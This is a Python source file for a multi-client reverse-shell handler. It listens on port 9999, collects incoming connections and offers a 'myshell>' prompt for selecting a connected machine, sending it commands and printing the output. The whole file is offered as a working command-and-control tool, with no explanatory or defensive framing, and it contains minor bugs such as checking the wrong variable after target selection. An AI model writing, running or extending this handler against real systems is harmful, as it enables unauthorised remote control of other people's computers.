import socket
import threading
import time
from queue import Queue


queue=Queue()
No_of_threads=2
job_no=[1,2]
all_connections=[]
all_add=[]


def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s=socket.socket()
    except socket.error as msg:
        print("socket creation error :"+str(msg))


def socket_bind():
    try:
        global host
        global port
        global s
        print("binding host to port: "+str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Binding error :"+str(msg)+"\nRetrying.....")
        time.sleep(5)
        socket_bind()


def socket_accept():
    for i in all_connections:
        i.close()
    del all_connections[:]
    del all_add[:]
    while True:
        try:
            conn, add=s.accept()
            conn.setblocking(True)
            all_connections.append(conn)
            all_add.append(add)
            print("Connection established: \n IP"+add[0]+"  | port "+str(add[1]))
        except socket.error as msg:
            print("connection accepting errors :"+str(msg))

def start_shell():
    while True:
        cmd=input("myshell> ")
        if cmd=="list":
            list_connections()
        elif "select" in cmd:
            conn = get_target(cmd)
            if cmd is not None:
                send_target_commands(conn)
        else:
            print("command not recognised\n")

def list_connections():
    results=""
    for i,conn in enumerate(all_connections):

        try:
            conn.send(str.encode(" "))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_add[i]
            continue
        results+=str(i)+ "   " +str(all_add[i][0]) +"  "+str(all_add[i][1])
    print("-------------------CLIENTS----------------------\n"+results)



def get_target(cmd):
    try:
        target=cmd.replace("select "," ")
        target=int(target)
        conn=all_connections[target]
        print("connected to"+str(all_add[target][0]))
        print(str(all_add[target][0])+"> ",end="")
        return conn
    except socket.error as msg:
        print(str(msg)+"\not a valid connection")
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd=input()
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_response=str(conn.recv(20480),"utf-8")
                print(client_response,end="")
            if cmd=="quit":
                break
        except:
            print("connection lost")
            break


def create_workers():
    for i in range(No_of_threads):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()


def work():
    while True:
        x = queue.get()
        if  x==1:
            socket_create()
            socket_bind()
            socket_accept()
        if x==2:
            start_shell()
        queue.task_done()




def create_jobs():
    for i in job_no:
        queue.put(i)
    queue.join()





create_workers()
create_jobs()

































